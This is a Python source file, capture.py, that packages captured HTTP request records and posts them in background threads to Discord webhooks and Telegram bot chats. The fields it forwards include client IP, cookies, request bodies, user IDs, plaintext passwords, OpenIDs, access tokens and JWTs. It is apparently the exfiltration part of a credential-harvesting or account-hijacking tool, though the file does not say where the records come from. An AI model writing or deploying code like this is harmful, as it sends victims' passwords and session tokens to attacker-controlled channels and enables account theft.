# capture.py
import json
import threading
import urllib.request


def _h(s):
    if s is None:
        return ""
    return str(s).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


# ============================================================
#  DISCORD WEBHOOK
# ============================================================

class DiscordCapture:
    def __init__(self, webhook_urls):
        if isinstance(webhook_urls, str):
            webhook_urls = [webhook_urls]
        self.urls = [u for u in webhook_urls if u]

    def send(self, record: dict):
        if not self.urls:
            return
        threading.Thread(target=self._send_sync, args=(record,), daemon=True).start()

    def _send_sync(self, record):
        payload = self._build_embed(record)
        for url in self.urls:
            try:
                self._post(url, payload)
            except Exception as e:
                print(f"[capture:discord] {e}")

    def _build_embed(self, r):
        src = r.get("source") or "?"
        color = {
            "generated":        0x2ecc71,
            "generated_failed": 0xe74c3c,
            "request":          0x3498db,
        }.get(src, 0x95a5a6)

        fields = []
        fields.append({"name": "🌐 IP",   "value": f"`{r.get('ip') or '-'}`", "inline": True})
        fields.append({"name": "📍 Path", "value": f"`{r.get('method') or '-'} {r.get('path') or '-'}`", "inline": True})
        fields.append({"name": "🕒 Time", "value": f"`{r.get('ts') or '-'}`", "inline": False})

        if r.get("user_agent"):
            fields.append({"name": "🧭 UA", "value": f"```{r.get('user_agent')[:200]}```", "inline": False})
        if r.get("referer"):
            fields.append({"name": "🔗 Referer", "value": f"```{r.get('referer')[:200]}```", "inline": False})

        q = r.get("query")
        if q and q not in ("{}", "null", "None"):
            fields.append({"name": "🧾 Query", "value": f"```json\n{q[:900]}\n```", "inline": False})

        b = r.get("body")
        if b:
            fields.append({"name": "📨 Body", "value": f"```\n{b[:900]}\n```", "inline": False})

        c = r.get("cookies")
        if c and c not in ("{}", "null", "None"):
            fields.append({"name": "🍪 Cookies", "value": f"```{c[:900]}```", "inline": False})

        if r.get("uid"):
            fields.append({"name": "🆔 UID", "value": f"`{r.get('uid')}`", "inline": True})
        if r.get("password"):
            fields.append({"name": "🔑 Pass", "value": f"`{r.get('password')}`", "inline": True})
        if r.get("open_id"):
            fields.append({"name": "🧩 OpenID", "value": f"`{r.get('open_id')}`", "inline": True})
        if r.get("real_uid"):
            fields.append({"name": "👤 RealUID", "value": f"`{r.get('real_uid')}`", "inline": True})

        if r.get("access_token"):
            fields.append({"name": "🎟 AccessToken", "value": f"```\n{r.get('access_token')[:900]}\n```", "inline": False})
        if r.get("jwt_token"):
            fields.append({"name": "💎 JWT", "value": f"```\n{r.get('jwt_token')[:900]}\n```", "inline": False})
        if r.get("error"):
            fields.append({"name": "⚠️ Error", "value": f"```{r.get('error')[:900]}```", "inline": False})

        embed = {
            "title":     f"📥 {src}",
            "color":     color,
            "fields":    fields[:25],
            "timestamp": r.get("ts"),
            "footer":    {"text": "API Capture"},
        }
        return {"embeds": [embed]}

    def _post(self, url, payload):
        data = json.dumps(payload).encode()
        req = urllib.request.Request(
            url, data=data,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        urllib.request.urlopen(req, timeout=8).read()


# ============================================================
#  TELEGRAM
# ============================================================

class TelegramCapture:
    API = "https://api.telegram.org/bot{token}/{method}"

    def __init__(self, bot_token, chat_ids):
        self.token = bot_token or ""
        if isinstance(chat_ids, (str, int)):
            chat_ids = [chat_ids]
        self.chats = [str(c) for c in (chat_ids or [])]

    def send(self, record: dict):
        if not self.token or not self.chats:
            return
        threading.Thread(target=self._send_sync, args=(record,), daemon=True).start()

    def _send_sync(self, record):
        text = self._format(record)
        for chat_id in self.chats:
            try:
                self._message(chat_id, text)
            except Exception as e:
                print(f"[capture:telegram:{chat_id}] {e}")

    def _format(self, r):
        L = [f"📥 <b>{_h(r.get('source'))}</b>",
             f"🕒 <code>{_h(r.get('ts'))}</code>", "",
             f"🌐 <b>IP:</b> <code>{_h(r.get('ip'))}</code>",
             f"📍 <b>{_h(r.get('method'))} {_h(r.get('path'))}</b>"]
        if r.get("user_agent"):
            L.append(f"🧭 <b>UA:</b> {_h(r.get('user_agent'))[:180]}")
        if r.get("referer"):
            L.append(f"🔗 <b>Ref:</b> {_h(r.get('referer'))[:150]}")
        q = r.get("query")
        if q and q not in ("{}", "null", "None"):
            L.append(f"🧾 <b>Query:</b> <code>{_h(q)}</code>")
        b = r.get("body")
        if b:
            L.append(f"📨 <b>Body:</b>\n<code>{_h(b)[:500]}</code>")
        c = r.get("cookies")
        if c and c not in ("{}", "null", "None"):
            L.append(f"🍪 <b>Cookies:</b> <code>{_h(c)[:300]}</code>")
        L.append("")
        for k, icon, lab in [("uid","🆔","UID"),("password","🔑","Pass"),
                             ("open_id","🧩","OpenID"),("real_uid","👤","RealUID")]:
            if r.get(k):
                L.append(f"{icon} <b>{lab}:</b> <code>{_h(r.get(k))}</code>")
        if r.get("access_token"):
            L.append(f"🎟 <b>AccessToken:</b>\n<code>{_h(r.get('access_token'))}</code>")
        if r.get("jwt_token"):
            L.append(f"💎 <b>JWT:</b>\n<code>{_h(r.get('jwt_token'))}</code>")
        if r.get("error"):
            L.append(f"⚠️ <b>Error:</b> {_h(r.get('error'))}")
        return "\n".join(L)

    def _api(self, m):
        return self.API.format(token=self.token, method=m)

    def _message(self, chat_id, text):
        chunks, buf, limit = [], "", 4000
        for line in text.split("\n"):
            if len(buf) + len(line) + 1 > limit:
                chunks.append(buf); buf = line
            else:
                buf = (buf + "\n" + line) if buf else line
        if buf: chunks.append(buf)

        for chunk in chunks:
            data = json.dumps({
                "chat_id": chat_id, "text": chunk,
                "parse_mode": "HTML", "disable_web_page_preview": True,
            }).encode()
            req = urllib.request.Request(self._api("sendMessage"), data=data,
                headers={"Content-Type": "application/json"}, method="POST")
            urllib.request.urlopen(req, timeout=8).read()